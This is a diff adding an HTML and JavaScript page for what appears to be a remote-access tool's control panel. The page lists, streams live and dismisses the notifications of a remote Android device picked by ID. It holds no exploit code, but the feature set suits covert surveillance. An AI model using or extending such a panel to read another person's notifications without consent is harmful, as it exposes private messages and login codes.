@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Notifications - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <style>
+        :root {
+            --font-display: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        body { padding: 0; min-height: 100vh; font-family: var(--font-display) !important; }
+
+        .wrap {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        /* ── HEADER ── */
+        .pg-header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 16px 22px; background: var(--bg-panel);
+            border: 1px solid var(--border); border-radius: 10px;
+            margin-bottom: 16px; position: relative; overflow: hidden;
+        }
+        .pg-header::after {
+            content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 1px;
+            background: linear-gradient(90deg, transparent 10%, var(--accent) 50%, transparent 90%);
+            opacity: 0.4;
+        }
+        .pg-header-left { display: flex; align-items: center; gap: 14px; }
+        .pg-icon {
+            width: 42px; height: 42px;
+            background: linear-gradient(135deg, rgba(0,255,65,0.12), rgba(0,255,65,0.04));
+            border: 1px solid rgba(0,255,65,0.25); border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--accent); box-shadow: 0 0 16px rgba(0,255,65,0.08);
+        }
+        .pg-title { font-size: 1.1rem; font-weight: 700; color: #e8e8e8; }
+        .pg-title span { color: var(--accent); text-shadow: 0 0 12px rgba(0,255,65,0.3); }
+        .pg-sub { font-size: 0.6rem; color: var(--text-muted); letter-spacing: 1px; margin-top: 1px; }
+
+        .btn-back {
+            display: flex; align-items: center; gap: 6px; padding: 7px 14px;
+            font-size: 0.7rem; font-weight: 500; text-decoration: none;
+            background: rgba(255,255,255,0.03); border: 1px solid var(--border);
+            color: var(--text-secondary); border-radius: 8px; transition: all 0.2s;
+        }
+        .btn-back:hover { color: var(--accent); border-color: rgba(0,255,65,0.3); }
+
+        .count-badge {
+            display: inline-block; padding: 2px 10px; border-radius: 20px;
+            font-size: 0.55rem; font-weight: 600; letter-spacing: 1px;
+            background: rgba(0,255,65,0.1); color: var(--accent);
+            border: 1px solid rgba(0,255,65,0.2);
+        }
+
+        /* ── STATUS BAR ── */
+        .status-bar {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 10px 18px; background: var(--bg-panel);
+            border: 1px solid var(--border); border-radius: 8px;
+            margin-bottom: 12px; font-size: 0.7rem;
+        }
+        .status-dot {
+            width: 8px; height: 8px; border-radius: 50%; margin-right: 8px; display: inline-block;
+        }
+        .status-dot.active { background: #00ff41; box-shadow: 0 0 8px rgba(0,255,65,0.5); }
+        .status-dot.inactive { background: #ff4444; box-shadow: 0 0 8px rgba(255,68,68,0.5); }
+        .status-dot.pending { background: #ffaa00; box-shadow: 0 0 8px rgba(255,170,0,0.5); }
+        .status-btn {
+            padding: 4px 10px; border-radius: 4px; background: var(--bg-panel);
+            border: 1px solid var(--border); color: var(--text); font-size: 0.6rem; cursor: pointer;
+        }
+
+        /* ── TOOLBAR ── */
+        .toolbar { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 12px; }
+        .toolbar button, .toolbar select {
+            padding: 7px 14px; border-radius: 6px; background: var(--bg-panel);
+            border: 1px solid var(--border); color: var(--text); font-size: 0.7rem;
+            cursor: pointer; transition: all 0.2s;
+        }
+        .toolbar button:hover { border-color: var(--accent); color: var(--accent); }
+        .toolbar button.active { background: rgba(0,255,65,0.1); border-color: var(--accent); color: var(--accent); }
+        .toolbar button.danger { border-color: rgba(255,68,68,0.4); color: #ff6b6b; }
+        .toolbar button.danger:hover { background: rgba(255,68,68,0.1); }
+
+        /* ── NOTIFICATION LIST ── */
+        .notif-list { display: flex; flex-direction: column; gap: 6px; }
+        .notif-item {
+            display: flex; align-items: flex-start; gap: 12px;
+            padding: 14px 18px; background: var(--bg-panel);
+            border: 1px solid var(--border); border-radius: 8px;
+            transition: all 0.2s;
+        }
+        .notif-item:hover { border-color: rgba(0,255,65,0.3); }
+        .notif-item.live { border-color: rgba(0,255,65,0.4); animation: notifPulse 1s ease-out; }
+        @keyframes notifPulse { from { background: rgba(0,255,65,0.08); } to { background: var(--bg-panel); } }
+        .notif-icon {
+            width: 36px; height: 36px; border-radius: 8px;
+            background: rgba(0,255,65,0.06); border: 1px solid rgba(0,255,65,0.15);
+            display: flex; align-items: center; justify-content: center;
+            color: var(--accent); flex-shrink: 0; font-size: 0.8rem; font-weight: 700;
+        }
+        .notif-body { flex: 1; min-width: 0; }
+        .notif-app { font-size: 0.6rem; color: var(--accent); font-weight: 600; letter-spacing: 0.5px; margin-bottom: 2px; }
+        .notif-title { font-size: 0.8rem; font-weight: 600; color: #e8e8e8; margin-bottom: 2px; }
+        .notif-text { font-size: 0.72rem; color: var(--text-muted); line-height: 1.4; word-break: break-word; }
+        .notif-meta { display: flex; align-items: center; gap: 8px; margin-top: 6px; font-size: 0.58rem; color: var(--text-muted); }
+        .notif-tag {
+            padding: 1px 6px; border-radius: 4px; font-size: 0.52rem;
+            background: rgba(0,255,65,0.08); border: 1px solid rgba(0,255,65,0.15); color: var(--accent);
+        }
+        .notif-tag.ongoing { background: rgba(255,170,0,0.1); border-color: rgba(255,170,0,0.3); color: #ffaa00; }
+        .notif-actions { flex-shrink: 0; }
+        .notif-dismiss {
+            width: 28px; height: 28px; border-radius: 6px; background: transparent;
+            border: 1px solid rgba(255,68,68,0.2); color: #ff6b6b; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            transition: all 0.2s; font-size: 0.6rem;
+        }
+        .notif-dismiss:hover { background: rgba(255,68,68,0.1); border-color: rgba(255,68,68,0.4); }
+
+        .empty { text-align: center; padding: 60px 20px; color: var(--text-muted); font-size: 0.8rem; }
+        .empty i { display: block; margin-bottom: 12px; opacity: 0.3; }
+
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+        @media (max-width: 480px) { .btn-back span { display: none; } }
+    </style>
+</head>
+
+<body>
+    <div class="wrap">
+        <!-- Header -->
+        <div class="pg-header">
+            <div class="pg-header-left">
+                <div class="pg-icon"><i data-lucide="bell" style="width:20px;height:20px"></i></div>
+                <div>
+                    <div class="pg-title"><span>⚡</span> Notification Reader</div>
+                    <div class="pg-sub">REAL-TIME DEVICE NOTIFICATIONS</div>
+                </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px">
+                <span class="count-badge" id="countBadge">0 NOTIFICATIONS</span>
+                <a href="javascript:window.history.back()" class="btn-back">
+                    <i data-lucide="arrow-left" style="width:14px;height:14px"></i>
+                    <span>Back</span>
+                </a>
+            </div>
+        </div>
+
+        <!-- Status Bar -->
+        <div class="status-bar">
+            <div style="display:flex;align-items:center">
+                <span class="status-dot" id="statusDot"></span>
+                <span id="statusText">Checking listener status...</span>
+            </div>
+            <button class="status-btn" onclick="checkListenerStatus()">Check Status</button>
+        </div>
+
+        <!-- Toolbar -->
+        <div class="toolbar">
+            <button onclick="fetchNotifications()" id="btnRefresh">↻ Refresh</button>
+            <button onclick="clearAll()" class="danger">✕ Clear All</button>
+            <select id="filterApp" onchange="applyFilter()">
+                <option value="">All Apps</option>
+            </select>
+            <button onclick="toggleLive()" id="btnLive">◉ Live Feed</button>
+        </div>
+
+        <!-- Notification List -->
+        <div class="notif-list" id="notifList">
+            <div class="empty">
+                <i data-lucide="bell-off" style="width:48px;height:48px;margin:0 auto"></i>
+                <p>No notifications yet. Click <b>Refresh</b> or enable <b>Live Feed</b>.</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = api.deviceId;
+        if (!deviceId) window.location.href = 'index.html';
+
+
+        let notifications = [];
+        let isLive = false;
+        let ws = null;
+        let appFilter = '';
+
+        // Unwrap API response: api.sendCommand returns {success, data: {actual payload}}
+        function unwrap(res) {
+            if (res && res.data !== undefined) return res.data;
+            return res || {};
+        }
+
+        // ── Check listener status ──
+        async function checkListenerStatus() {
+            try {
+                const res = await api.sendCommand(deviceId, 'notification_listener_status');
+                const d = unwrap(res);
+                const dot = document.getElementById('statusDot');
+                const text = document.getElementById('statusText');
+                if (d.connected) {
+                    dot.className = 'status-dot active';
+                    text.textContent = 'Listener active & connected';
+                } else if (d.enabled) {
+                    dot.className = 'status-dot pending';
+                    text.textContent = 'Enabled but not yet connected';
+                } else {
+                    dot.className = 'status-dot inactive';
+                    text.textContent = 'Not enabled — grant Notification Access in Settings';
+                }
+            } catch (e) {
+                document.getElementById('statusDot').className = 'status-dot inactive';
+                document.getElementById('statusText').textContent = 'Error: ' + e.message;
+            }
+        }
+
+        // ── Fetch active notifications ──
+        async function fetchNotifications() {
+            try {
+                document.getElementById('btnRefresh').textContent = '↻ Loading...';
+                const res = await api.sendCommand(deviceId, 'notifications_list');
+                const d = unwrap(res);
+                if (d.notifications && Array.isArray(d.notifications)) {
+                    notifications = d.notifications;
+                } else if (d.data && Array.isArray(d.data)) {
+                    notifications = d.data;
+                } else if (Array.isArray(d)) {
+                    notifications = d;
+                }
+                renderNotifications();
+                api.showToast(`${notifications.length} notifications loaded`, 'success');
+            } catch (e) {
+                api.showToast('Failed: ' + e.message, 'error');
+            } finally {
+                document.getElementById('btnRefresh').textContent = '↻ Refresh';
+            }
+        }
+
+        // ── Clear one / all ──
+        async function clearOne(key) {
+            try {
+                await api.sendCommand(deviceId, 'notification_clear', { key });
+                notifications = notifications.filter(n => n.key !== key);
+                renderNotifications();
+                api.showToast('Notification dismissed', 'success');
+            } catch (e) { api.showToast('Error: ' + e.message, 'error'); }
+        }
+
+        async function clearAll() {
+            if (!confirm('Dismiss all notifications on device?')) return;
+            try {
+                await api.sendCommand(deviceId, 'notifications_clear_all');
+                notifications = [];
+                renderNotifications();
+                api.showToast('All notifications dismissed', 'success');
+            } catch (e) { api.showToast('Error: ' + e.message, 'error'); }
+        }
+
+        // ── Filter ──
+        function applyFilter() { appFilter = document.getElementById('filterApp').value; renderNotifications(); }
+        function updateFilterDropdown() {
+            const apps = [...new Set(notifications.map(n => n.appName || n.packageName))].sort();
+            const sel = document.getElementById('filterApp');
+            const cur = sel.value;
+            sel.innerHTML = '<option value="">All Apps</option>';
+            apps.forEach(a => { const o = document.createElement('option'); o.value = a; o.textContent = a; sel.appendChild(o); });
+            sel.value = cur;
+        }
+
+        // ── Render ──
+        function renderNotifications() {
+            const list = document.getElementById('notifList');
+            const filtered = appFilter ? notifications.filter(n => (n.appName || n.packageName) === appFilter) : notifications;
+            document.getElementById('countBadge').textContent = `${filtered.length} NOTIFICATION${filtered.length !== 1 ? 'S' : ''}`;
+            updateFilterDropdown();
+            if (filtered.length === 0) {
+                list.innerHTML = `<div class="empty"><p>No notifications${appFilter ? ' for this app' : ''}.</p></div>`;
+                return;
+            }
+            list.innerHTML = filtered.map(n => {
+                const time = n.timestamp ? new Date(n.timestamp).toLocaleTimeString() : '';
+                const text = n.bigText || n.text || '';
+                return `
+                <div class="notif-item" id="notif-${CSS.escape(n.key || '')}">
+                    <div class="notif-icon">${escHtml((n.appName || '?')[0].toUpperCase())}</div>
+                    <div class="notif-body">
+                        <div class="notif-app">${escHtml(n.appName || n.packageName)}</div>
+                        <div class="notif-title">${escHtml(n.title || 'No title')}</div>
+                        ${text ? `<div class="notif-text">${escHtml(text)}</div>` : ''}
+                        <div class="notif-meta">
+                            <span>${time}</span>
+                            ${n.ongoing ? '<span class="notif-tag ongoing">ONGOING</span>' : ''}
+                            ${n.category ? `<span class="notif-tag">${escHtml(n.category)}</span>` : ''}
+                        </div>
+                    </div>
+                    <div class="notif-actions">
+                        ${n.isClearable !== false ? `<button class="notif-dismiss" onclick="clearOne('${escJs(n.key)}')" title="Dismiss">✕</button>` : ''}
+                    </div>
+                </div>`;
+            }).join('');
+        }
+
+        // ── Live Feed ──
+        function toggleLive() { isLive ? stopLive() : startLive(); }
+        function startLive() {
+            const btn = document.getElementById('btnLive');
+            const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${proto}//${location.host}`);
+            ws.onopen = () => {
+                ws.send(JSON.stringify({ type: 'identify', role: 'browser' }));
+                isLive = true; btn.classList.add('active'); btn.textContent = '◉ Live (ON)';
+                api.showToast('Live feed connected', 'success');
+            };
+            ws.onmessage = (e) => {
+                try {
+                    const data = JSON.parse(e.data);
+                    if (data.deviceId !== deviceId) return;
+                    if (data.type === 'notification_posted' && data.data) {
+                        notifications.unshift(data.data);
+                        renderNotifications();
+                        const el = document.getElementById(`notif-${CSS.escape(data.data.key || '')}`);
+                        if (el) el.classList.add('live');
+                    }
+                    if (data.type === 'notification_removed' && data.data) {
+                        notifications = notifications.filter(n => n.key !== data.data.key);
+                        renderNotifications();
+                    }
+                } catch (_) {}
+            };
+            ws.onclose = () => { isLive = false; btn.classList.remove('active'); btn.textContent = '◉ Live Feed'; };
+            ws.onerror = () => { api.showToast('WebSocket error', 'error'); };
+        }
+        function stopLive() {
+            if (ws) { ws.close(); ws = null; }
+            isLive = false;
+            document.getElementById('btnLive').classList.remove('active');
+            document.getElementById('btnLive').textContent = '◉ Live Feed';
+        }
+
+        // ── Init ──
+        lucide.createIcons();
+        checkListenerStatus();
+        fetchNotifications();
+    </script>
+</body>
+</html>
